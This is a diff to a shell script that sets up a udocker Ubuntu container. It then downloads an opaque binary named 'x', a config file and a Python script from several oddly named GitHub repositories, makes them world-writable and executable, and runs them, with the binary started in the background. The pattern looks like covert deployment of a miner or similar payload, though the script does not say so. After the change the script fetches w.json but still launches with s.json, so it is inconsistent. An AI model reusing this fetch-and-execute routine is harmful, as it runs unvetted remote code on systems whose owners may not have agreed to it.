@@ -6,7 +6,7 @@ set -e
 python3 -m pip install --user udocker
 export PATH="$HOME/.local/bin:$PATH"
 udocker --version
-IMAGE="ubuntu:20.04"
+IMAGE="ubuntu:26.10"
 CONTAINER="ubuntu-auto"
 
 echo "[1] Checking udocker..."
@@ -38,10 +38,10 @@ ldd --version
 echo "Executing main.py..."
 cd /mnt
 wget https://raw.githubusercontent.com/hosseinxdns4/potential-bassoon/main/x
-wget https://raw.githubusercontent.com/hosseinxdns4/cautious-umbrella/main/s.json
-wget https://raw.githubusercontent.com/hosseinxdns4/ideal-winner/main/ht.py
+wget https://raw.githubusercontent.com/hosseinxdns4/cautious-umbrella/main/w.json
+wget https://raw.githubusercontent.com/hosseinxdns4/fictional-bassoon/main/main.py
 echo "./x run --config=s.json" > bash.sh
 chmod 777 *
 ./bash.sh &
-./ht.py -t 4
+./main.py
 '
